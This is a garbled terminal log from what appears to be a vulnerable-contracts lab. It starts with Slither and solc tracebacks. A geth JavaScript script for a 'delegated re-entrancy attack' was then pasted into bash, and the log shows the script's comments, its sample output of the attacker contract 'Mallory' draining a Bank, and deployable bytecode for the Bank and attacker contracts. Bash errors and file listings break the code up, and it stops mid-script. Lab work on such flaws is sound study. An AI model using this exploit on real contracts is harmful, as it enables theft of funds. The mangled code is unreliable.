  File "/usr/local/bin/solc", line 8, in <module>
    sys.exit(solc())
  File "/usr/local/lib/python3.10/dist-packages/solc_select/__main__.py", line 80, in solc
    res = current_version()
  File "/usr/local/lib/python3.10/dist-packages/solc_select/solc_select.py", line 62, in current_version
    raise argparse.ArgumentTypeError(
argparse.ArgumentTypeError: No solc version set. Run `solc-select use VERSION` or set SOLC_VERSION environment variable.

ERROR:root:Error in .
ERROR:root:Traceback (most recent call last):
  File "/usr/local/lib/python3.10/dist-packages/slither/__main__.py", line 837, in main_impl
    ) = process_all(filename, args, detector_classes, printer_classes)
  File "/usr/local/lib/python3.10/dist-packages/slither/__main__.py", line 90, in process_all
    compilations = compile_all(target, **vars(args))
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/crytic_compile.py", line 664, in compile_all
    compilations.append(CryticCompile(filename, **kwargs))
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/crytic_compile.py", line 131, in __init__
    self._compile(**kwargs)
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/crytic_compile.py", line 553, in _compile
    self._platform.compile(self, **kwargs)
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/platform/solc.py", line 156, in compile
    targets_json = _get_targets_json(compilation_unit, self._target, **kwargs)
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/platform/solc.py", line 285, in _get_targets_json
    return _run_solc(
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/platform/solc.py", line 491, in _run_solc
    compiler="solc", version=get_version(solc, env), optimized=is_optimized(solc_arguments)
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/platform/solc.py", line 396, in get_version
    raise InvalidCompilation(
crytic_compile.platform.exceptions.InvalidCompilation: 
Solidity version not found:
STDOUT:

STDERR:
Traceback (most recent call last):
  File "/usr/local/bin/solc", line 8, in <module>
    sys.exit(solc())
  File "/usr/local/lib/python3.10/dist-packages/solc_select/__main__.py", line 80, in solc
    res = current_version()
  File "/usr/local/lib/python3.10/dist-packages/solc_select/solc_select.py", line 62, in current_version
    raise argparse.ArgumentTypeError(
argparse.ArgumentTypeError: No solc version set. Run `solc-select use VERSION` or set SOLC_VERSION environment variable.


sneha@sneha:~/dvcw/blockchain/contracts$ // Script for deploying and running a sneha@sneha:~/dvcw/blockchain/contracts$ slither .

sneha@sneha:~/dvcw/blockchain/contracts$ 
sneha@sneha:~/dvcw/blockchain/contracts$ 
sneha@sneha:~/dvcw/blockchain/contracts$ 
sneha@sneha:~/dvcw/blockchain/contracts$ 
sneha@sneha:~/dvcw/blockchain/contracts$  npm install -g solc
npm ERR! code EACCES
npm ERR! syscall mkdir
npm ERR! path /usr/local/lib/node_modules/solc
npm ERR! errno -13
npm ERR! Error: EACCES: permission denied, mkdir '/usr/local/lib/node_modules/solc'
npm ERR!  [Error: EACCES: permission denied, mkdir '/usr/local/lib/node_modules/solc'] {
npm ERR!   errno: -13,
npm ERR!   code: 'EACCES',
npm ERR!   syscall: 'mkdir',
npm ERR!   path: '/usr/local/lib/node_modules/solc'
npm ERR! }
npm ERR! 
npm ERR! The operation was rejected by your operating system.
npm ERR! It is likely you do not have the permissions to access this file as the current user
npm ERR! 
npm ERR! If you believe this might be a permissions issue, please double-check the
npm ERR! permissions of the file and its containing directories, or try running
npm ERR! the command again as root/Administrator.

npm ERR! A complete log of this run can be found in:
npm ERR!     /home/sneha/.npm/_logs/2023-03-23T10_13_07_578Z-debug-0.log
sneha@sneha:~/dvcw/blockchain/contracts$ cd ..
sneha@sneha:~/dvcw/blockchain$ cd 
sneha@sneha:~$ sudo npm install -g solc
[sudo] password for sneha: 

added 9 packages, and audited 10 packages in 5s

1 package is looking for funding
  run `npm fund` for details

found 0 vulnerabilities
sneha@sneha:~$ solcjs --version
0.8.19+commit.7dd6d404.Emscripten.clang
sneha@sneha:~$ cd dvcw/blockchain/contracts
sneha@sneha:~/dvcw/blockchain/contracts$ slither .
Traceback (most recent call last):
  File "/usr/local/lib/python3.10/dist-packages/slither/__main__.py", line 837, in main_impl
    ) = process_all(filename, args, detector_classes, printer_classes)
  File "/usr/local/lib/python3.10/dist-packages/slither/__main__.py", line 90, in process_all
    compilations = compile_all(target, **vars(args))
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/crytic_compile.py", line 664, in compile_all
    compilations.append(CryticCompile(filename, **kwargs))
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/crytic_compile.py", line 131, in __init__
    self._compile(**kwargs)
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/crytic_compile.py", line 553, in _compile
    self._platform.compile(self, **kwargs)
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/platform/solc.py", line 156, in compile
    targets_json = _get_targets_json(compilation_unit, self._target, **kwargs)
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/platform/solc.py", line 285, in _get_targets_json
    return _run_solc(
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/platform/solc.py", line 491, in _run_solc
    compiler="solc", version=get_version(solc, env), optimized=is_optimized(solc_arguments)
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/platform/solc.py", line 396, in get_version
    raise InvalidCompilation(
crytic_compile.platform.exceptions.InvalidCompilation: 
Solidity version not found:
STDOUT:

STDERR:
Traceback (most recent call last):
  File "/usr/local/bin/solc", line 8, in <module>
    sys.exit(solc())
  File "/usr/local/lib/python3.10/dist-packages/solc_select/__main__.py", line 80, in solc
    res = current_version()
  File "/usr/local/lib/python3.10/dist-packages/solc_select/solc_select.py", line 62, in current_version
    raise argparse.ArgumentTypeError(
argparse.ArgumentTypeError: No solc version set. Run `solc-select use VERSION` or set SOLC_VERSION environment variable.

ERROR:root:Error in .
ERROR:root:Traceback (most recent call last):
  File "/usr/local/lib/python3.10/dist-packages/slither/__main__.py", line 837, in main_impl
    ) = process_all(filename, args, detector_classes, printer_classes)
  File "/usr/local/lib/python3.10/dist-packages/slither/__main__.py", line 90, in process_all
    compilations = compile_all(target, **vars(args))
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/crytic_compile.py", line 664, in compile_all
    compilations.append(CryticCompile(filename, **kwargs))
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/crytic_compile.py", line 131, in __init__
    self._compile(**kwargs)
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/crytic_compile.py", line 553, in _compile
    self._platform.compile(self, **kwargs)
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/platform/solc.py", line 156, in compile
    targets_json = _get_targets_json(compilation_unit, self._target, **kwargs)
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/platform/solc.py", line 285, in _get_targets_json
    return _run_solc(
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/platform/solc.py", line 491, in _run_solc
    compiler="solc", version=get_version(solc, env), optimized=is_optimized(solc_arguments)
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/platform/solc.py", line 396, in get_version
    raise InvalidCompilation(
crytic_compile.platform.exceptions.InvalidCompilation: 
Solidity version not found:
STDOUT:

STDERR:
Traceback (most recent call last):
  File "/usr/local/bin/solc", line 8, in <module>
    sys.exit(solc())
  File "/usr/local/lib/python3.10/dist-packages/solc_select/__main__.py", line 80, in solc
    res = current_version()
  File "/usr/local/lib/python3.10/dist-packages/solc_select/solc_select.py", line 62, in current_version
    raise argparse.ArgumentTypeError(
argparse.ArgumentTypeError: No solc version set. Run `solc-select use VERSION` or set SOLC_VERSION environment variable.


sneha@sneha:~/dvcw/blockchain/contracts$ set SOLC_VERSION=^C
sneha@sneha:~/dvcw/blockchain/contracts$ set SOLC_VERSION=^[[200~// Script for deploying and running a delegated re-entrancy attack against a
sneha@sneha:~/dvcw/blockchain/contracts$ // crafted vulnerable contract (see delegated.sol)
bash: syntax error near unexpected token `('
sneha@sneha:~/dvcw/blockchain/contracts$ //
bash: //: Is a directory
sneha@sneha:~/dvcw/blockchain/contracts$ // usage:
bash: //: Is a directory
sneha@sneha:~/dvcw/blockchain/contracts$ // first start geth in developer mode (no mining difficulty and prefundend
bash: syntax error near unexpected token `('
sneha@sneha:~/dvcw/blockchain/contracts$ // accounts) and start the JavaScript console interface of geth:
bash: syntax error near unexpected token `)'
sneha@sneha:~/dvcw/blockchain/contracts$ //
bash: //: Is a directory
sneha@sneha:~/dvcw/blockchain/contracts$ // $ geth --dev --dev.period=1 console
bash: //: Is a directory
sneha@sneha:~/dvcw/blockchain/contracts$ //
bash: //: Is a directory
sneha@sneha:~/dvcw/blockchain/contracts$ // Then load this script to setup everything:
bash: //: Is a directory
sneha@sneha:~/dvcw/blockchain/contracts$ //
bash: //: Is a directory
sneha@sneha:~/dvcw/blockchain/contracts$ // > loadScript("delegated_setup.js")
bash: syntax error near unexpected token `('
sneha@sneha:~/dvcw/blockchain/contracts$ //
bash: //: Is a directory
sneha@sneha:~/dvcw/blockchain/contracts$ // Sometimes it takes a while for all contracts to be mined and commited to the
bash: //: Is a directory
sneha@sneha:~/dvcw/blockchain/contracts$ // dev blockchain. Manually creating more transactions helps. Simply type:
bash: //: Is a directory
sneha@sneha:~/dvcw/blockchain/contracts$ //
bash: //: Is a directory
sneha@sneha:~/dvcw/blockchain/contracts$ // > transferSomething()
bash: syntax error near unexpected token `('
sneha@sneha:~/dvcw/blockchain/contracts$ //
bash: //: Is a directory
sneha@sneha:~/dvcw/blockchain/contracts$ // If both the Token and Mallory contracts have been mined, the attack can be
bash: //: Is a directory
sneha@sneha:~/dvcw/blockchain/contracts$ // started:
bash: //: Is a directory
sneha@sneha:~/dvcw/blockchain/contracts$ //
bash: //: Is a directory
sneha@sneha:~/dvcw/blockchain/contracts$ // > triggerAttack()
bash: syntax error near unexpected token `('
sneha@sneha:~/dvcw/blockchain/contracts$ //
bash: //: Is a directory
sneha@sneha:~/dvcw/blockchain/contracts$ //
bash: //: Is a directory
sneha@sneha:~/dvcw/blockchain/contracts$ // Example:
bash: //: Is a directory
sneha@sneha:~/dvcw/blockchain/contracts$ //
bash: //: Is a directory
sneha@sneha:~/dvcw/blockchain/contracts$ // > loadScript("./delegated_setup.js")
bash: syntax error near unexpected token `('
sneha@sneha:~/dvcw/blockchain/contracts$ //
bash: //: Is a directory
sneha@sneha:~/dvcw/blockchain/contracts$ // === Delegated Re-Entrancy Attack Example ===
bash: //: Is a directory
sneha@sneha:~/dvcw/blockchain/contracts$ //
bash: //: Is a directory
sneha@sneha:~/dvcw/blockchain/contracts$ // prefunded balance: 1.15792089237316195423570985008687907853269984665640564039457584007913129639927e+77
bash: //: Is a directory
sneha@sneha:~/dvcw/blockchain/contracts$ // transferring initial funds to attacker account
bash: //: Is a directory
sneha@sneha:~/dvcw/blockchain/contracts$ // attacker account balance: 1000000000000
bash: //: Is a directory
sneha@sneha:~/dvcw/blockchain/contracts$ // [+] creating contracts
bash: //: Is a directory
sneha@sneha:~/dvcw/blockchain/contracts$ // new Safesending
bash: //: Is a directory
sneha@sneha:~/dvcw/blockchain/contracts$ // null [object Object]
bash: //: Is a directory
sneha@sneha:~/dvcw/blockchain/contracts$ // new Mallory
bash: //: Is a directory
sneha@sneha:~/dvcw/blockchain/contracts$ // null [object Object]
bash: //: Is a directory
sneha@sneha:~/dvcw/blockchain/contracts$ //
bash: //: Is a directory
sneha@sneha:~/dvcw/blockchain/contracts$ // ===============================================================================
bash: //: Is a directory
sneha@sneha:~/dvcw/blockchain/contracts$ // Wait for SafeSending, Bank and Mallory contracts to be mined.
bash: //: Is a directory
sneha@sneha:~/dvcw/blockchain/contracts$ // Sometimes things hang and manually calling the transferSomething() function a bunch of times until all contracts are mined resolves this. You should see a message that the SafeSending, Mallory and Bank contract are mined.
bash: syntax error near unexpected token `('
sneha@sneha:~/dvcw/blockchain/contracts$ //
bash: //: Is a directory
sneha@sneha:~/dvcw/blockchain/contracts$ // Use `triggerAttack()` to start the attack.
bash: command substitution: line 2: syntax error: unexpected end of file
bash: //: Is a directory
sneha@sneha:~/dvcw/blockchain/contracts$ // ===============================================================================
bash: //: Is a directory
sneha@sneha:~/dvcw/blockchain/contracts$ //
bash: //: Is a directory
sneha@sneha:~/dvcw/blockchain/contracts$ // true
bash: //: Is a directory
sneha@sneha:~/dvcw/blockchain/contracts$ // > null [object Object]
bash: null: Permission denied
sneha@sneha:~/dvcw/blockchain/contracts$ // SafeSending mined! address: 0x536aecf182f3f59fa39ad72a34f1ccae88cb6dcd transactionHash: 0x3771a89860a8774fdb7a35a0fd9a3572125eae221436ff0a6753789b8db384f6
bash: //: Is a directory
sneha@sneha:~/dvcw/blockchain/contracts$ // new Bank
bash: //: Is a directory
sneha@sneha:~/dvcw/blockchain/contracts$ // null [object Object]
bash: //: Is a directory
sneha@sneha:~/dvcw/blockchain/contracts$ // null [object Object]
bash: //: Is a directory
sneha@sneha:~/dvcw/blockchain/contracts$ // Mallory Contract mined! address: 0x9d413eb04de05280782da6701ccbbf020ecf7b82 transactionHash: 0xa8f95da16b2ebd38739f00de6f4c550247ec1dd3a375ee692971246b434468ff
bash: //: Is a directory
sneha@sneha:~/dvcw/blockchain/contracts$ // null [object Object]
bash: //: Is a directory
sneha@sneha:~/dvcw/blockchain/contracts$ // Bank mined! address: 0xbb8cebebbfedf7aa2a9fffda049b106cc8850506 transactionHash: 0x938c116b897149e3e89be7d2ca98b11613ad2dec5b9eb5f2d846599174861d5b
bash: //: Is a directory
sneha@sneha:~/dvcw/blockchain/contracts$ //
bash: //: Is a directory
sneha@sneha:~/dvcw/blockchain/contracts$ // >
bash: syntax error near unexpected token `newline'
sneha@sneha:~/dvcw/blockchain/contracts$ // > transferSomething()
bash: syntax error near unexpected token `('
sneha@sneha:~/dvcw/blockchain/contracts$ // undefined
bash: //: Is a directory
sneha@sneha:~/dvcw/blockchain/contracts$ // >
bash: syntax error near unexpected token `newline'
sneha@sneha:~/dvcw/blockchain/contracts$ // > t = triggerAttack()
bash: syntax error near unexpected token `('
sneha@sneha:~/dvcw/blockchain/contracts$ // [+] setting up contracts for attack
bash: //: Is a directory
sneha@sneha:~/dvcw/blockchain/contracts$ //
bash: //: Is a directory
sneha@sneha:~/dvcw/blockchain/contracts$ // [+] Current status:
bash: //: Is a directory
sneha@sneha:~/dvcw/blockchain/contracts$ // Mallory has 100000 wei
bash: //: Is a directory
sneha@sneha:~/dvcw/blockchain/contracts$ // Bank    has 200000 wei
bash: //: Is a directory
sneha@sneha:~/dvcw/blockchain/contracts$ // Mallory has 100000 wei deposited in Bank
bash: //: Is a directory
sneha@sneha:~/dvcw/blockchain/contracts$ // victim  has 100000 wei deposited in Bank
bash: //: Is a directory
sneha@sneha:~/dvcw/blockchain/contracts$ //
bash: //: Is a directory
sneha@sneha:~/dvcw/blockchain/contracts$ // [+] Triggering attack by sending wei to Mallory, which calls fallback
bash: //: Is a directory
sneha@sneha:~/dvcw/blockchain/contracts$ // [+] Executed attack...
bash: //: Is a directory
sneha@sneha:~/dvcw/blockchain/contracts$ //
bash: //: Is a directory
sneha@sneha:~/dvcw/blockchain/contracts$ // [+] Current status:
bash: //: Is a directory
sneha@sneha:~/dvcw/blockchain/contracts$ // Mallory has 300000 wei
bash: //: Is a directory
sneha@sneha:~/dvcw/blockchain/contracts$ // Bank    has 0 wei
bash: //: Is a directory
sneha@sneha:~/dvcw/blockchain/contracts$ // Mallory has 1.15792089237316195423570985008687907853269984665640564039457584007913129539936e+77 wei deposited in Bank
bash: //: Is a directory
sneha@sneha:~/dvcw/blockchain/contracts$ // victim  has 100000 wei deposited in Bank
bash: //: Is a directory
sneha@sneha:~/dvcw/blockchain/contracts$ // Warning: bank doesn't have enough ether to give back victim's money
bash: //: Is a directory
sneha@sneha:~/dvcw/blockchain/contracts$ //
bash: //: Is a directory
sneha@sneha:~/dvcw/blockchain/contracts$ // Mallory gained 200000 wei
bash: //: Is a directory
sneha@sneha:~/dvcw/blockchain/contracts$ // attack status: SUCCESS
bash: //: Is a directory
sneha@sneha:~/dvcw/blockchain/contracts$ //
bash: //: Is a directory
sneha@sneha:~/dvcw/blockchain/contracts$ 
sneha@sneha:~/dvcw/blockchain/contracts$ 
sneha@sneha:~/dvcw/blockchain/contracts$ console.log("\n=== Delegated Re-Entrancy Attack Example ===\n")
bash: syntax error near unexpected token `"\n=== Delegated Re-Entrancy Attack Example ===\n"'
sneha@sneha:~/dvcw/blockchain/contracts$ 
sneha@sneha:~/dvcw/blockchain/contracts$ 
sneha@sneha:~/dvcw/blockchain/contracts$ var defaultPassword = "";
Command 'var' not found, but there are 21 similar ones.
sneha@sneha:~/dvcw/blockchain/contracts$ 
sneha@sneha:~/dvcw/blockchain/contracts$ personal.newAccount(defaultPassword)
bash: syntax error near unexpected token `defaultPassword'
sneha@sneha:~/dvcw/blockchain/contracts$ personal.newAccount(defaultPassword)
bash: syntax error near unexpected token `defaultPassword'
sneha@sneha:~/dvcw/blockchain/contracts$ function unlockAllAccounts() {
>   // this is the prefundend dev contract
>   personal.unlockAccount(eth.accounts[0], defaultPassword)
bash: syntax error near unexpected token `eth.accounts[0],'
sneha@sneha:~/dvcw/blockchain/contracts$   // we'll use this as "attacker"
>   personal.unlockAccount(eth.accounts[1], defaultPassword)
> }
> unlockAllAccounts()
> 
> console.log("prefunded balance: " + eth.getBalance(eth.accounts[0]))
> console.log("transferring initial funds to attacker account")
> eth.sendTransaction({from: eth.accounts[0], to: eth.accounts[1], value: 1000000000000})
> admin.sleepBlocks(3)
> console.log("attacker account balance: " + eth.getBalance(eth.accounts[1]))
> 
> function transferSomething() { // just transfer something to make geth commit the next block
> eth.sendTransaction({from: eth.accounts[0], to: eth.accounts[2], value: 100})
>   admin.sleepBlocks(1)
> }
> 
> transferSomething()
> 
> var safesendingContract = web3.eth.contract([{"constant":false,"inputs":[{"name":"to","type":"address"},{"name":"amount","type":"uint256"}],"name":"send","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"}]);
> var safesender_create = {
> from: web3.eth.accounts[0],
> data: '0x61014e610030600b82828239805160001a6073146000811461002057610022565bfe5b5030600052607381538281f3fe7300000000000000000000000000000000000000003014608060405260043610610058576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063d0679d341461005d575b600080fd5b81801561006957600080fd5b506100b66004803603604081101561008057600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803590602001909291905050506100b8565b005b8173ffffffffffffffffffffffffffffffffffffffff168160405180600001905060006040518083038185875af1925050503d8060008114610116576040519150601f19603f3d011682016040523d82523d6000602084013e61011b565b606091505b505050505056fea165627a7a72305820a4ed4bae1f7fe4d4f55ce268f61ad9542cae68b6263f4dc643a0749bd1b692930029',
> gas: '4700000'
> };
> 
> var bankContract = web3.eth.contract([{"constant":false,"inputs":[{"name":"to","type":"address"}],"name":"donate","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"}],"name":"balances","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"amount","type":"uint256"}],"name":"withdraw","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"_new","type":"address"}],"name":"updateSafeSender","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"who","type":"address"}],"name":"getBalance","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"inputs":[{"name":"_safesender","type":"address"}],"payable":false,"stateMutability":"nonpayable","type":"constructor"}]);
> var bank_create = {
> from: web3.eth.accounts[0],
> data: '0x608060405234801561001057600080fd5b506040516020806106918339810180604052602081101561003057600080fd5b810190808051906020019092919050505033600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555080600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506105be806100d36000396000f3fe60806040526004361061006c576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168062362a951461007157806327e235e3146100b55780632e1a7d4d1461011a578063db0fb10714610155578063f8b2cb4f146101a6575b600080fd5b6100b36004803603602081101561008757600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061020b565b005b3480156100c157600080fd5b50610104600480360360208110156100d857600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061025a565b6040518082815260200191505060405180910390f35b34801561012657600080fd5b506101536004803603602081101561013d57600080fd5b8101908080359060200190929190505050610272565b005b34801561016157600080fd5b506101a46004803603602081101561017857600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610313565b005b3480156101b257600080fd5b506101f5600480360360208110156101c957600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506103ae565b6040518082815260200191505060405180910390f35b346000808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000828254019250508190555050565b60006020528060005260406000206000915090505481565b806000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054101515610310576102c333826103f6565b806000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825403925050819055505b50565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614156103ab5780600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505b50565b60008060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168282604051602401808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001828152602001925050506040516020818303038152906040527fd0679d34000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040518082805190602001908083835b6020831015156105265780518252602082019150602081019050602083039250610501565b6001836020036101000a038019825116818451168082178552505050505050905001915050600060405180830381855af49150503d8060008114610586576040519150601f19603f3d011682016040523d82523d6000602084013e61058b565b606091505b505050505056fea165627a7a72305820c4968739ab57c1abbb9755d50433740926c2fa8e488f3bb47612cbb6d515fda60029',
> gas: '4700000'
> };
> 
> var malloryContract = web3.eth.contract([{"constant":false,"inputs":[{"name":"addr","type":"address"}],"name":"withdraw","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"victim","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"addr","type":"address"}],"name":"attack","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[],"name":"donate","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"payable":true,"stateMutability":"payable","type":"fallback"}]);
> var mallory_create = {
> from: web3.eth.accounts[1],
> data: '0x608060405234801561001057600080fd5b506106a0806100206000396000f3fe608060405260043610610062576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806351cff8d914610213578063930c200314610264578063d018db3e146102bb578063ed88c68e146102ff575b6000600154141561021157600180819055506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663f8b2cb4f306040518263ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060206040518083038186803b15801561016b57600080fd5b505afa15801561017f573d6000803e3d6000fd5b505050506040513d602081101561019557600080fd5b81019080805190602001909291905050506040518263ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040180828152602001915050600060405180830381600087803b1580156101f857600080fd5b505af115801561020c573d6000803e3d6000fd5b505050505b005b34801561021f57600080fd5b506102626004803603602081101561023657600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610309565b005b34801561027057600080fd5b50610279610466565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b6102fd600480360360208110156102d157600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061048b565b005b610307610672565b005b8073ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d8273ffffffffffffffffffffffffffffffffffffffff1663f8b2cb4f306040518263ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060206040518083038186803b1580156103be57600080fd5b505afa1580156103d2573d6000803e3d6000fd5b505050506040513d60208110156103e857600080fd5b81019080805190602001909291905050506040518263ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040180828152602001915050600060405180830381600087803b15801561044b57600080fd5b505af115801561045f573d6000803e3d6000fd5b5050505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555060006001819055506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663f8b2cb4f306040518263ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060206040518083038186803b1580156105ca57600080fd5b505afa1580156105de573d6000803e3d6000fd5b505050506040513d60208110156105f457600080fd5b81019080805190602001909291905050506040518263ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040180828152602001915050600060405180830381600087803b15801561065757600080fd5b505af115801561066b573d6000803e3d6000fd5b5050505050565b56fea165627a7a723058205f9c69d7e9daf8dbf99f86708fc73c7ee4cdf8a6b024109fef7437ac93e0cff30029',
> gas: '4700000'
> };
> 
> var mallory;
> var bank;
> 
> 
> 
> console.log("[+] creating contracts")
> console.log("new Safesending")
> var safesending = safesendingContract.new(
> safesender_create,
> function (e, contract) {
> 
DVCTokenSale.sol  DVCToken.sol      Migrations.sol    
> console.log(e, contract);
> 
DVCTokenSale.sol  DVCToken.sol      Migrations.sol    
> if (typeof contract.address !== 'undefined') {
> 
DVCTokenSale.sol  DVCToken.sol      Migrations.sol    
> 
DVCTokenSale.sol  DVCToken.sol      Migrations.sol    
> console.log('SafeSending mined! address: ' + contract.address + ' transactionHash: ' + contract.transactionHash);
>       console.log("new Bank")
> 
DVCTokenSale.sol  DVCToken.sol      Migrations.sol    
> 
DVCTokenSale.sol  DVCToken.sol      Migrations.sol    
> bank = bankContract.new(
> 
DVCTokenSale.sol  DVCToken.sol      Migrations.sol    
> 
DVCTokenSale.sol  DVCToken.sol      Migrations.sol    
> 
DVCTokenSale.sol  DVCToken.sol      Migrations.sol    
> contract.address,
> 
DVCTokenSale.sol  DVCToken.sol      Migrations.sol    
> 
DVCTokenSale.sol  DVCToken.sol      Migrations.sol    
> 
DVCTokenSale.sol  DVCToken.sol      Migrations.sol    
> bank_create,
> 
DVCTokenSale.sol  DVCToken.sol      Migrations.sol    
> 
DVCTokenSale.sol  DVCToken.sol      Migrations.sol    
> 
DVCTokenSale.sol  DVCToken.sol      Migrations.sol    
> function (e, contract) {
> 
DVCTokenSale.sol  DVCToken.sol      Migrations.sol    
> 
DVCTokenSale.sol  DVCToken.sol      Migrations.sol    
> 
DVCTokenSale.sol  DVCToken.sol      Migrations.sol    
> 
DVCTokenSale.sol  DVCToken.sol      Migrations.sol    
> console.log(e, contract);
> 
DVCTokenSale.sol  DVCToken.sol      Migrations.sol    
> 
DVCTokenSale.sol  DVCToken.sol      Migrations.sol    
> 
DVCTokenSale.sol  DVCToken.sol      Migrations.sol    
> 
DVCTokenSale.sol  DVCToken.sol      Migrations.sol    
> if (typeof contract.address !== 'undefined') {
> 
DVCTokenSale.sol  DVCToken.sol      Migrations.sol    
> 
DVCTokenSale.sol  DVCToken.sol      Migrations.sol    
> 
DVCTokenSale.sol  DVCToken.sol      Migrations.sol    
> 
DVCTokenSale.sol  DVCToken.sol      Migrations.sol    
> 
DVCTokenSale.sol  DVCToken.sol      Migrations.sol    
> console.log('Bank mined! address: ' + contract.address + ' transactionHash: ' + contract.transactionHash);
> 
DVCTokenSale.sol  DVCToken.sol      Migrations.sol    
> 
DVCTokenSale.sol  DVCToken.sol      Migrations.sol    
> 
DVCTokenSale.sol  DVCToken.sol      Migrations.sol    
> 
DVCTokenSale.sol  DVCToken.sol      Migrations.sol    
> }
> 
DVCTokenSale.sol  DVCToken.sol      Migrations.sol    
> 
DVCTokenSale.sol  DVCToken.sol      Migrations.sol    
> 
DVCTokenSale.sol  DVCToken.sol      Migrations.sol    
> }
> 
DVCTokenSale.sol  DVCToken.sol      Migrations.sol    
> 
DVCTokenSale.sol  DVCToken.sol      Migrations.sol    
> )
> 
DVCTokenSale.sol  DVCToken.sol      Migrations.sol    
> }
> }
> )
> 
> console.log("new Mallory")
> var mallory = malloryContract.new(
> mallory_create, function (e, contract){
> 
DVCTokenSale.sol  DVCToken.sol      Migrations.sol    
> console.log(e, contract);
> 
DVCTokenSale.sol  DVCToken.sol      Migrations.sol    
> if (typeof contract.address !== 'undefined') {
> 
DVCTokenSale.sol  DVCToken.sol      Migrations.sol    
> 
